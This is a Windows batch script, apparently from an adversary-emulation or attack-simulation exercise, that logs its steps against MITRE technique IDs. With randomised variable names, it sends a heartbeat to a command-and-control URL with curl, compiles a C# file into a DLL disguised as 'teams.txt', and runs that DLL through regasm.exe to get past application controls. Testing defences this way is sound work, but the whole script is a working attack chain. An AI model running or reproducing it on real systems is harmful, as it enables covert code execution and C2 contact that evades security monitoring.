@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8510\ff6b7c23
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8510-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=8510

REM Generated random variable names
SET jhxcbz=%APPDATA%\!ufeybybm!\macula-simulations.log
SET kvbnml=csc.exe
SET xcvbnm=!recnn!
SET lkjhgf=%windir%\Microsoft.NET\Framework\v4.0.30319\regasm.exe
SET qwerty=1
SET poiuytr=
SET asdfgh=0
SET zxcvb=assembly_load_failed

REM 1. C2 HEARTBEAT (must be first task)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!jhxcbz!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=!ERRORLEVEL!>> "!jhxcbz!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!xcvbnm!>> "!jhxcbz!" 2>nul
cd /d "!xcvbnm!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_result=!ERRORLEVEL!>> "!jhxcbz!" 2>nul

REM 3. Compile .NET source to DLL (T1500)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!jhxcbz!" 2>nul
"!kvbnml!" /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
SET t1500res=!ERRORLEVEL!
IF !t1500res! EQU 0 (
    SET qwerty=1
    SET poiuytr=
) ELSE (
    SET asdfgh=1
    SET zxcvb=compile_error_!t1500res!
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!qwerty!:!poiuytr!>> "!jhxcbz!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=!t1500res!>> "!jhxcbz!" 2>nul

REM 4. Execute via regasm.exe (T1218)
IF EXIST "!hpnjatpj!" (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_start=!hpnjatpj!>> "!jhxcbz!" 2>nul
    "!lkjhgf!" /U "!hpnjatpj!" >nul 2>&1
    SET t1218res=!ERRORLEVEL!
    IF !t1218res! EQU 0 (
        SET qwerty=1
        SET poiuytr=
    ) ELSE (
        SET asdfgh=1
        SET zxcvb=regasm_failed_!t1218res!
    )
    echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!qwerty!:!poiuytr!>> "!jhxcbz!" 2>nul
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_complete=!t1218res!>> "!jhxcbz!" 2>nul
) ELSE (
    SET asdfgh=1
    SET zxcvb=file_not_found
    echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=0:!zxcvb!>> "!jhxcbz!" 2>nul
)

ENDLOCAL